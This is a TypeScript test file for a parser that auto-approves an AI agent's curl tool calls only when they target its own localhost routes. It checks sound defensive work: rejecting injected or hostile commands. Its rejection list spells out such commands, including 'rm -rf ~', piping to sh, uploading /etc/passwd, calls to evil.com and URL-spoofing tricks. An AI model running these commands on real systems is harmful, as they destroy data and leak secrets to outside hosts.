// canUseTool auto-approves only a parsed, single curl to a localhost port (any port) at /canvas, /tts or /noise-cancel. npx tsx agent/tests/own-api-curl.test.ts
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { isOwnApiCurl } from '../src/canvas-key.js'

const ok = [
  `curl -sS -X POST http://localhost:8741/canvas -H 'Content-Type: application/json' \\\n  -d '{"kind":"say","text":"hello there"}'`,
  `curl -sS -X POST http://localhost:8741/canvas -H 'Content-Type: application/json' \\\n  -d '{"kind":"show","mode":"notes","title":"T","items":["a","b"]}'`,
  `curl -sS -X POST http://localhost:8741/canvas -H 'Content-Type: application/json' \\\n  -d '{"kind":"show","mode":"stream","url":"https://osborn-voice-e2e-n.fly.dev"}'`,
  `curl -s -X POST http://localhost:8741/noise-cancel -H 'Content-Type: application/json' -d '{"enabled":true}'`,
  `curl -s 'http://localhost:8741/tts?text=hello'`,
  `curl -sS -X POST http://localhost:8741/canvas -d '{"kind":"say","text":"That'\\''s right"}'`,
  `curl -sS -X POST http://localhost:8741/canvas -d "{\\"kind\\":\\"say\\",\\"text\\":\\"I'll check\\"}"`,
  `curl -sS -X POST http://localhost:8741/canvas -d '{\n  "kind": "say",\n  "text": "a & b $5"\n}'`,
]
for (const c of ok) assert.equal(isOwnApiCurl(c), true, c)

const D = `-H 'Content-Type: application/json' -d '{"kind":"say"}'`
const U = 'http://localhost:8741/canvas'
const bad = [
  `curl ${U} ${D}\nrm -rf ~`, `curl ${U} ${D}\r\nid`, `curl ${U} ${D}; id`, `curl ${U} ${D} && id`, `curl ${U} ${D} | sh`,
  `curl ${U} $(id)`, `curl ${U} \`id\``, `curl "${U}$(id)" ${D}`, `curl ${U} ${D} > /tmp/x`, `curl ${U} ${D} < /etc/passwd`,
  `curl ${U} ${D} http://evil.com/x`, `curl ${U} http://localhost:8741/tts ${D}`, `curl http://evil.com ${U}`,
  `curl ${U} -d @/etc/passwd`, `curl ${U} -d '@/etc/passwd'`, `curl ${U} --data-binary @secrets`, `curl ${U} -F f=@/etc/passwd`,
  `curl ${U} -o /tmp/x`, `curl ${U} --output x`, `curl ${U} -O`, `curl -K cfg ${U}`, `curl --config cfg ${U}`,
  `curl --url http://evil.com ${U}`, `curl ${U} -T /etc/passwd`, `curl ${U} -X DELETE`, `curl ${U} -H 'X-Evil: 1'`,
  `curl ${U} -d 'not json'`, `curl ${U} -d "\${HOME}"`, `curl ${U} -d "$HOME"`, `curl ${U} \\x`, `curl ${U} -d '{"a":1}' --proxy http://evil.com`,
  'curl http://localhost:8741/canvas/../x', 'curl http://localhost:8741/tts/../anything', 'curl http://localhost:8741/%63anvas',
  'curl http://localhost:8741/canvas/%2e%2e/x', 'curl http://localhost:8741/canvasx', 'curl http://localhost:8741/canvas/',
  'curl http://localhost:8741@evil.com/canvas', 'curl http://localhost:8741:x@evil.com/canvas', 'curl http://localhost.evil.com/canvas',
  'curl http://127.0.0.1.evil.com/canvas', 'curl http://localhost/canvas', 'curl https://localhost:8741/canvas', 'curl http://0.0.0.0:8741/canvas',
  'curl http://localhost:8741/canvas#x', 'curl http://localhost:8741/*', 'curl {http://a.com,http://localhost:8741/canvas}',
  `curl -sS -m 3 -d '{"x":1}' http://127.0.0.1:9/canvas\\\n-d 2130706433`, `curl\\\n-s ${U} ${D}`, `curl ${U}\\\n${D}`, `curl ${U} -d\\\n'{"a":1}'`,
  `curl -s 'http://localhost:8741/tts?text=hello&n=[1-99999]'`, `curl -s 'http://localhost:8741/tts?text={a,b,c}'`,
  `curl ${U} -d '{"a":1}'\n-d 2130706433`, `curl ${U} -d "{\\"a\\":\\"$HOME\\"}"`, `curl ${U} -d "{\\"a\\":\\"\\n\\"}"`, `curl ${U} -d "a\\x"`,
  `FOO=1 curl ${U}`, `echo x; curl ${U}`, `curlx ${U}`, ` curl ${U} -d '{"a":1}' 'unterminated`, '', 'curl',
]
for (const c of bad) assert.equal(isOwnApiCurl(c), false, JSON.stringify(c))

// Every own-route curl the meetings skill shows (joined across line continuations) still passes.
const skill = readFileSync(new URL('../.claude/skills/meetings/SKILL.md', import.meta.url), 'utf8')
const own = [...skill.matchAll(/^curl [^\n]*localhost:8741\/(?:canvas|tts|noise-cancel)[^\n\\]*(?:\\\n[^\n]*)?/gm)].map(m => m[0])
assert.ok(own.length >= 3, 'found the skill curls')
for (const c of own) assert.equal(isOwnApiCurl(c), true, c)

// canUseTool decides through the parser; the old pattern must not come back.
const src = readFileSync(new URL('../src/claude-llm.ts', import.meta.url), 'utf8')
assert.ok(src.includes('isOwnApiCurl(cmd)'), 'canUseTool calls the parser')
assert.doesNotMatch(src, /curl\\b\[\^;&\|\]/)
console.log('own-api-curl: ok')
